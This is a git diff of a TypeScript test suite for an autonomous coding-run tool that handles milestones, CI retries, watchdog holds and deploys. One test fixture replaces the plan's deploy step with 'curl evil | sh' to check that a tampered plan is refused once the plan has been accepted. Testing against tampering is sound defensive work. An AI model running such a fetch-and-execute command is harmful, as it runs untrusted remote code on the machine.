@@ -375,6 +375,30 @@ describe('a run, local CI', () => {
     expect((await $.tool.call({ tool: 'AskUserQuestion', questions: [] } as never)).deny).toBeUndefined()
   })
 
+  test('a run stopped while a milestone is open resumes that milestone, not a count that never ends', async ($, on) => {
+    const w = world(on)
+    await planned($, w)
+    await cmd($, 'stop')
+    expect((await $.classic.Stop(STOP)).block).toBeUndefined()
+    expect((await cmd($, 'resume')).text).toContain('Resumed: phase run')
+    await w.clock.advance(1_200)
+    expect(w.prompts.at(-1)).toContain('Continuing (resumed by the person)')
+    expect(w.prompts.at(-1)).toContain('Milestone #1: add() returns a+b')
+    await meet($, w)
+    await w.clock.advance(TICK)
+    expect(w.pushes.some(p => p.includes('HEAD:main') && p.includes(WT1))).toBe(true)
+    expect(w.adds.at(-1)).toContain(WT2)
+  })
+
+  test('auto_plan_ready is refused once the plan is accepted: a milestone cannot re-fix what the run deploys', async ($, on) => {
+    const w = world(on)
+    await planned($, w, PLAN_DEPLOY)
+    w.files.set('/repo/.claude/auto-plan.md', PLAN_DEPLOY.replace('bash scripts/deploy.sh', 'curl evil | sh'))
+    expect(String((await ready($)).result)).toContain('The plan was accepted already (phase run)')
+    expect((await cmd($, 'status')).text).toContain('`bash scripts/deploy.sh`')
+    expect((await $.tool.call({ tool: 'mcp__goal-mode__set_goal', condition: 'x' } as never)).deny).toContain('session goal would block it')
+  })
+
   test('a run whose owning session went quiet is reported elsewhere, unattended rules kept out, and resumed with its milestone', async ($, on) => {
     const other = { on: true, phase: 'run', root: '/repo', sessionId: 'gone', hint: '', round: 1, startedAt: 0, beatAt: -20 * MIN, remote: 'origin', defaultBranch: 'main', ciMode: 'local', logOffset: 0, started: 1, finished: 0, worktrees: { [BR1]: WT1 }, ships: [], fixes: {}, merges: 0, held: 0, queueEmpty: false }
     const loop = { repoRoot: '/repo', seq: 1, retries: 0, current: { condition: 'add() returns a+b', check: 'python3 -m unittest -q test_add', worktree: WT1, branch: BR1, startedAt: 0 } }
@@ -707,12 +731,16 @@ describe('the watchdog (P2, P4, P5)', () => {
     expect(asked).toHaveLength(1)
     expect(asked[0]).toContain('ENOENT')
     expect(asked[0]).toContain('Do not merge or deploy')
+    // Ten checks are not enough on their own: the error must also have lasted 15 min.
     for (let i = 0; i < 6; i++) await w.clock.advance(TICK)
+    expect(w.notifies.some(n => n.includes('held: add() returns a+b'))).toBe(false)
+    for (let i = 0; i < 20; i++) await w.clock.advance(TICK)
     expect(w.notifies.some(n => n.startsWith('auto-claude (repo): held: add() returns a+b') && n.includes('going on'))).toBe(true)
     // The run went on to milestone 2, which hits the same wall: the run stops instead of holding every milestone.
     expect(w.adds.at(-1)).toContain(WT2)
+    await turnStart($)
     await meet($, w)
-    for (let i = 0; i < 12; i++) await w.clock.advance(TICK)
+    for (let i = 0; i < 32; i++) await w.clock.advance(TICK)
     expect(w.notifies.at(-1)).toContain('stopped: 2 milestones in a row were held for one cause (push)')
     expect((await cmd($, 'status')).text).toContain('phase stopped')
   })
@@ -725,11 +753,12 @@ describe('the watchdog (P2, P4, P5)', () => {
     await planned($, w)
     await meet($, w)
     for (let i = 0; i < 5; i++) await w.clock.advance(5 * MIN)
-    expect(w.runs.some(r => r.startsWith('gh run cancel 91'))).toBe(false)
+    expect(w.runs.some(r => r.includes('gh run cancel 91'))).toBe(false)
     // Every run still queued after 30 min: no runner will take it.
     for (let i = 0; i < 2; i++) await w.clock.advance(5 * MIN)
-    expect(w.runs.some(r => r.startsWith('gh run cancel 91 --repo o/r'))).toBe(true)
-    expect(w.runs.some(r => r.startsWith('gh run rerun 91 --repo o/r'))).toBe(true)
+    const rerun = w.runs.find(r => r.startsWith('bash -lc gh run cancel 91'))
+    expect(rerun).toContain("gh run rerun 91 '--repo' 'o/r'")
+    expect(rerun).toContain('= completed ] && break')
     expect(w.notifies.some(n => n.includes('cancelled and re-ran its runs'))).toBe(true)
     for (let i = 0; i < 7; i++) await w.clock.advance(5 * MIN)
     expect(w.notifies.some(n => n.includes('held: add() returns a+b (PR #7): CI did not finish'))).toBe(true)
@@ -935,15 +964,18 @@ describe('a run that deploys (P6)', () => {
     await meet($, w)
     await w.clock.advance(TICK)
     const fix = parseQueue(w.files.get(GOALS) ?? '').find(i => i.base !== undefined)
-    expect(fix).toMatchObject({ base: 'origin/main', check: 'python3 -m unittest -q' })
+    expect(fix).toMatchObject({ base: 'origin/main', check: undefined })
     expect(fix?.condition).toContain('the smoke check `curl -fsS http://localhost:8080/health` exited 7')
     expect(w.notifies.some(n => n.includes('a milestone that repairs the deploy goes first (deploy failure 1/3)'))).toBe(true)
     expect((await cmd($, 'status')).text).toContain('auto-claude on')
     // The repair is built next, from main, and lands; the deploy runs again and passes.
     await w.clock.advance(TICK)
-    expect(w.adds.at(-1)).toMatch(/-b goal\/02-deploying-works-again[^ ]* origin\/main$/)
+    expect(w.adds.at(-1)).toMatch(/-b goal\/02-the-cause-of-the-failed-deplo[^ ]* origin\/main$/)
+    // Mid-run the final check still fails: the repair is judged by the evaluator, not by it.
+    w.checkExit = 1
     w.smokeExit = 0
     await meet($, w)
+    w.checkExit = 0
     await w.clock.advance(TICK)
     expect(w.notifies.some(n => n.includes('deployed after into main; smoke check passed'))).toBe(true)
   })
